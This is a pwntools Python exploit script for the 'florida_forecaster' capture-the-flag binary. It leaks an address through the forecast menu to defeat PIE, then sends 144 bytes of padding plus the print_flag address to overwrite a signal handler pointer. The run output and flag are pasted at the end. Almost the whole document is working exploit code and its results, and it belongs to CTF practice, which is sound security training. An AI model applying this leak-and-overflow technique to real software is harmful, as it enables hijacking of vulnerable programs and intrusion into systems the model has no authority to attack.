#!/usr/bin/env python

import os
from pwn import *

elf = ELF("./florida_forecaster")
context.binary = elf

#
# GDB Script
#
# Remember: Lines that start with "#" are commands if running r2 instead of gdb

# Looks like gdbtui through gnu screen is broken... Add this when i can fix it..
# layout split
# layout regs

# For PIE breakpoints, utilize my gdb helper command
# breakpoint_pie "binary_name" ["main" or 0x1234]

gdbscript = """
c
#r2.cmd('dbm florida_forecaster 0x1311')
#r2.cmd('dc')
"""


def connect():
    global p, libc

    if "GDB" in os.environ:
        p = gdb.debug(elf.file.name, gdbscript=gdbscript)
        libc = p.libc

    elif "REMOTE" in os.environ:
        remote_addr = os.environ["REMOTE"].split(":")
        p = remote(remote_addr[0], int(remote_addr[1], 10), buffer_fill_size=0xFFFF)
        # libc = ELF(<REMOTE_LIBC_HERE>)

    else:
        p = process(elf.file.name)
        libc = p.libc


def forecast(one, two, florida_man=True):
    p.sendlineafter("Choice: ", "3")
    p.sendlineafter("parameter (integer): ", str(one))
    p.sendlineafter("parameter (integer): ", str(two))

    if florida_man:
        p.recvuntil("A Florida man ")

    return p.recvuntil("\n", drop=True)


connect()

do_test_address = int(forecast(1061109556, -12, False), 16)
elf.address = do_test_address - 0x1369

print_flag_addr = elf.address + 0x1288

print("Found main binary at: " + hex(elf.address))

"""
Find offset to the overwrite of the signal handler from my input in test:
    0x6161616161616173 == 144
"""

p.sendlineafter("Choice: ", "2")
p.sendlineafter("Enter test data", b"A" * 144 + p64(print_flag_addr)[:-2])
p.interactive()

"""
Found main binary at: 0x55be698a0000
[*] Switching to interactive mode

Received test data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��i�U
Does it match (y/n)?
Hey, you are taking too long
I'm only going to warn you once...
sun{Fl0rida_man_w1ll_get_a_FL4G!}
"""
